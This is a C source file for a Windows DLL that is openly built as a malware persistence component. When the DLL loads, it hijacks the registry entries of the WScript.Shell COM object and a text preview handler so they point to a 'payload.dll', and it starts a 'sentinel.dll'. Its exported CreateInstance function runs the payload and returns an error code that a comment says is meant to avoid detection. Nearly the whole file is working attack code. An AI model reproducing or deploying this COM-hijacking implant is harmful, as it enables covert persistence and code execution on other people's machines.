#include "payload.h"
#include "com_hijack.h"
#include "com_hijack_config.h"
#include <windows.h>
#include <stdio.h>

// DllMain entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Hijack high-traffic COM objects when DLL is loaded
            HijackCOMCLSID(WSCRIPT_SHELL_CLSID, "C:\\Windows\\System32\\payload.dll");
            HijackCOMCLSID(TEXT_PREVIEW_HANDLER_CLSID, "C:\\Windows\\System32\\payload.dll");
            
            // Load and execute sentinel DLL
            HMODULE sentinelDll = LoadLibraryA("C:\\Windows\\System32\\sentinel.dll");
            if (sentinelDll) {
                // Call exported function to start sentinel
                typedef void (*StartSentinelFunc)();
                StartSentinelFunc StartSentinel = (StartSentinelFunc)GetProcAddress(sentinelDll, "StartSentinel");
                if (StartSentinel) {
                    StartSentinel();
                }
            }
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// Exported function for COM hijack
__declspec(dllexport) HRESULT STDMETHODCALLTYPE CreateInstance(REFIID riid, void** ppvObject) {
    // Load sentinel DLL and execute payload
    LoadLibraryA("C:\\Windows\\System32\\sentinel.dll");
    
    // Return E_NOINTERFACE to avoid detection
    return E_NOINTERFACE;
}